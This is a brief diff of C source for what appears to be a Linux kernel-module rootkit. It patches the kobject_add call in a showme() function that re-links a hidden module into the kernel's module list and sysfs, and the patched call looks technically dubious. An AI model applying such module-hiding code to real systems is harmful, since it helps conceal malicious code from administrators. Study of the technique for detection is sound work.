@@ -56,7 +56,7 @@ void showme(void)
 {
 	hidden=0;
     list_add(&THIS_MODULE->list, prev_module);
-	kobject_add(prev_kobj);
+	kobject_add(prev_kobj, prev_kobj);
 	list_add(&THIS_MODULE->mkobj.kobj.entry, prev_kobj.entry);
 }
 
